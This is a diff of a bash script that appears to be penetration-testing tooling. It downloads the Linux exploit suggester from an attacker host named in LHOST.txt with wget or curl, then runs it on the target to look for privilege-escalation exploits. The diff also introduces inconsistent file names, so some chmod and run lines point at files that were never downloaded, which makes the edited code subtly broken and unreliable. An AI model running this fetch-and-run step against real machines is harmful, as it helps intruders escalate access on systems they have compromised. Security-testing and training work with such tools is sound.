@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/usr/bin/bash
 
 if [ -e LHOST.txt ] ; then
    cat LHOST.txt
@@ -39,8 +39,8 @@ if [ $input =  "wget" ] ; then
 ##### Linux Exploit Suggester Section #######
    cd $(pwd)
    wget http://"$lhost":80/linux/script/linux-exploit-suggester-2.pl
-   chmod 700 linux-exploit-suggester-2.pl
-   perl ./linux-exploit-suggester-2.pl > linux-exploit-suggester-2.txt  2>&1
+   chmod 700 linux-exploit.suggester-2.pl
+   ./linux-exploit-suggester-2.pl > linux-exploit-suggester-2.txt  2>&1
 #############################
 
 ##### Linux Privchecker Section #######
@@ -85,9 +85,9 @@ if [ $input =  "curl" ] ; then
 
 ##### Linux Exploit Suggester Section #######
    cd $(pwd)
-   curl -OL http://"$lhost":80/linux/script/linux-exploit-suggester-2.pl
+   curl -OL http://"$lhost":80/linux/script/linux-exploit.suggester-2.pl
    chmod 700 linux-exploit.suggester-2.pl
-   ./linux-exploit-suggester-2.pl > linux-exploit-suggester-2.txt  2>&1
+   ./linux-exploit.suggester-2.pl > linux-exploit-suggester-2.txt  2>&1
 #############################
 
 ##### Linux Privchecker Section #######
